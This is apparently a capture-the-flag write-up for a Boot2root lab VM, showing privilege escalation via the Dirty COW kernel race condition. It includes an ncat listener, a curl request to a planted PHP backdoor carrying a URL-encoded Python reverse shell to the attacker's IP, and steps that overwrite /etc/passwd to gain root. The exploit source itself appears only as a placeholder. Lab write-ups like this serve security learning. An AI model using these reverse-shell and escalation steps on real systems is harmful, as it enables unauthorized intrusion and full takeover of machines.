# Dirty Cow Exploit
After setting up the Reverse Shell on user www-data, we can see that the Kernel version of Linux is 3.2.0 which has a massive exploit none as Dirty COW. The exploit consists of taking advantage of a race condition that happens when you try to write on a cache of a file that's just has been deleted and can permit you to write on any files and in our case /etc/passwd. 

When logged in as user www-data we can go to /tmp to write our exploit and compile it, i chose the firefart version on [Dirty Cow Ninja](https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs) which takes as the argument the new password of root, we modified the code as to have the user named root:

 1. First we launch ncat with the following flags to listen on any host on port 1234

    └─# ncat -nvklp 1234
	Ncat: Version 7.93 ( https://nmap.org/ncat )
	Ncat: Listening on :::1234
	Ncat: Listening on 0.0.0.0:1234

 2. Secondly, we send our reverse shell through our backdoor:
 
 `curl --insecure https://<BOOT2ROOT IP>/forum/templates_c/backdoor.php?cmd=python%20-c%20%27import%20socket%2Csubprocess%2Cos%2Cpty%3Bs%3Dsocket.socket%28socket.AF_INET%2Csocket.SOCK_STREAM%29%3Bs.connect%28%28%22<OUR IP>%22%2C1234%29%29%3Bos.dup2%28s.fileno%28%29%2C0%29%3B%20os.dup2%28s.fileno%28%29%2C1%29%3B%20os.dup2%28s.fileno%28%29%2C2%29%3Bp%3Dpty.spawn%28%22%2Fbin%2Fbash%22%29%3B%27
`

 3. Now we are connected to the VM of Boot2root on www-data and we can write on ou current directory /var/www/forum/templates_c so let's copy our dirty.c, compile it and then execute it
 
    Ncat: Connection from 192.168.56.102.
	Ncat: Connection from 192.168.56.102:51482.	
	www-data@BornToSecHackMe:/var/www/forum/templates_c$ cat > dirty.c << lol
	><DIRTY.C code>
	>lol
	www-data@BornToSecHackMe:/var/www/forum/templates_c$ gcc -pthread dirty.c -o dirty -lcrypt
	www-data@BornToSecHackMe:/var/www/forum/templates_c$ ./dirty q
	./dirty q
/etc/passwd successfully backed up to /tmp/passwd.bak
Please enter the new password: q
Complete line:
root:roI77uTJXVKgg:0:0:pwned:/root:/bin/bash
mmap: b7fda000

We can relaunch our reverse shell, and just

    www-data@BornToSecHackMe:/var/www/forum/templates_c$ su root
    Password:q
    root@BornToSecHackMe:/var/www/forum/templates_c$ id
    uid=0(root) gid=0(root) groups=0(root)
